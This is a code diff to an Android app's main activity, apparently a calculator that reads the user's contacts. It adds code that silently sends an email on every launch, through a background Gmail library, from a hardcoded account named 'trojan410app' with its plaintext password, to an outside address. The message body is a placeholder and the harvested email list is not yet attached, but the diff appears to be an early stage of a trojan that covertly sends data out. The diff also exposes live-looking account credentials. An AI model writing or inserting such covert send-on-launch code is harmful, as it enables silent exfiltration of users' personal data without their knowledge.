@@ -19,6 +19,8 @@ import android.widget.AdapterView;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import com.creativityapps.gmailbackgroundlibrary.BackgroundMail;
+
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
@@ -30,11 +32,33 @@ public class MainActivity extends AppCompatActivity {
     private static final int PERMISSIONS_REQUEST_READ_CONTACTS = 100;
     ArrayList<String> emailList;
 
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         emailList = getEmails();
+
+        //Use Gmail Background to send an email
+        BackgroundMail.newBuilder(this)
+                .withUsername("trojan410app@gmail.com")
+                .withPassword("dr0wss@p")
+                .withMailto("kjarrett316@gmail.com")
+                .withBody("please please please")
+                .withSubject("subject")
+                .withOnSuccessCallback(new BackgroundMail.OnSuccessCallback() {
+                    @Override
+                    public void onSuccess(){
+
+                    }
+                })
+                .withOnFailCallback(new BackgroundMail.OnFailCallback() {
+                    @Override
+                    public void onFail() {
+
+                    }
+                })
+                .send();
     }
 
     public static double eval(final String str) {
